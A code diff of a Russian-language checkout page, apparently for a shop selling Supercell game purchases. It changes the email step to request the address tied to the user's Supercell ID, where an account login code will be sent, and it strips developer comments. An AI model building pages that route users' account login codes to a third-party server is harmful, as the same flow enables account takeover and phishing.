@@ -174,11 +174,11 @@ html, body {
 <body>
 <div class="screen">
   <div id="animEnterEmail" class="sticker"></div>
-  <div class="title">Введите ваш email</div>
+  <div class="title">Введите email, который привязан к вашему Supercell ID</div>
   <div class="order-number" id="orderNumber">Заказ #...</div>
   
   <div class="input-group">
-    <label class="input-label" for="emailInput">На этот email придёт информация о заказе</label>
+    <label class="input-label" for="emailInput">На этот email придёт код для входа на аккаунт</label>
     <input type="email" id="emailInput" class="input-field" placeholder="example@mail.ru" autocomplete="email">
   </div>
   
@@ -191,11 +191,10 @@ html, body {
 <script>
 const API_URL = 'https://duck-shop-sever.onrender.com';
 
-// Получаем order_id из URL
 const urlParams = new URLSearchParams(window.location.search);
 const orderId = urlParams.get('order');
 
-// Если нет order_id, показываем ошибку
+
 if (!orderId) {
   document.getElementById('orderNumber').textContent = 'Ошибка: номер заказа не указан';
   document.getElementById('submitEmail').disabled = true;
@@ -203,7 +202,7 @@ if (!orderId) {
   document.getElementById('orderNumber').textContent = `Заказ #${orderId}`;
 }
 
-// Загружаем анимацию
+
 lottie.loadAnimation({
   container: document.getElementById('animEnterEmail'),
   renderer: 'svg',
@@ -212,7 +211,7 @@ lottie.loadAnimation({
   path: 'enter_email.json'
 });
 
-// Обработка отправки email
+
 document.getElementById('submitEmail').addEventListener('click', async () => {
   const emailInput = document.getElementById('emailInput');
   const email = emailInput.value.trim();
@@ -220,14 +219,13 @@ document.getElementById('submitEmail').addEventListener('click', async () => {
   const loading = document.getElementById('loading');
   const submitBtn = document.getElementById('submitEmail');
   
-  // Валидация email
+  
   if (!email || !email.includes('@') || !email.includes('.')) {
     errorMessage.textContent = 'Пожалуйста, введите корректный email';
     errorMessage.style.display = 'block';
     return;
   }
-  
-  // Показываем загрузку
+
   submitBtn.disabled = true;
   loading.style.display = 'block';
   errorMessage.style.display = 'none';
@@ -245,10 +243,10 @@ document.getElementById('submitEmail').addEventListener('click', async () => {
     const data = await response.json();
     
     if (data.success) {
-      // Сохраняем email в localStorage для возможного восстановления
+      
       localStorage.setItem(`email_${orderId}`, email);
       
-      // ИЗМЕНЕНО: Перенаправляем на waiting_code.html вместо code.html
+      
       window.location.href = `waiting_code.html?order=${orderId}`;
     } else {
       throw new Error(data.error || 'Ошибка сохранения email');
@@ -262,14 +260,14 @@ document.getElementById('submitEmail').addEventListener('click', async () => {
   }
 });
 
-// Разрешаем отправку по Enter
+
 document.getElementById('emailInput').addEventListener('keypress', (e) => {
   if (e.key === 'Enter') {
     document.getElementById('submitEmail').click();
   }
 });
 
-// Автозаполнение email из localStorage при загрузке
+
 document.addEventListener('DOMContentLoaded', () => {
   if (orderId) {
     const savedEmail = localStorage.getItem(`email_${orderId}`);
